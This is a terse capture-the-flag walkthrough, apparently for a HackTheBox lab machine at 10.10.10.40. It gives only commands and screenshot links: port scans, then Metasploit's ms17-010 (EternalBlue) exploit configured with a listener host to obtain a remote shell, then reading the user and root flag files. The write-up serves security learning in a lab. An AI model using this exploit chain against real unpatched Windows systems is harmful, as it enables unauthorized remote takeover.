```bash
rustscan -a 10.10.10.40
```
![image](https://github.com/lufffe/Writeups/assets/90646635/19e47648-70bf-4493-8cb5-e0115720d048)

```bash
nmap -A -p 135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40
```
![image](https://github.com/lufffe/Writeups/assets/90646635/918c7140-6458-4ca1-a449-e112c63823cf)

![image](https://github.com/lufffe/Writeups/assets/90646635/5d821058-2119-44ac-82c3-401457def3e6)

```bash
msf6 > search ms17-010
```
![image](https://github.com/lufffe/Writeups/assets/90646635/608b3218-a83f-4fa9-b899-0cd895cac6bb)

```bash
use 0 
set lhost
set rhosts
exploit
```

```bash
shell
```
![image](https://github.com/lufffe/Writeups/assets/90646635/72240d65-0d31-4d93-b0b7-b6cfea73f3ba)

C:\Users\haris\Desktop>

```bash
type user.txt
```

C:\Users\Administrator\Desktop>

```bash
type root.txt
```
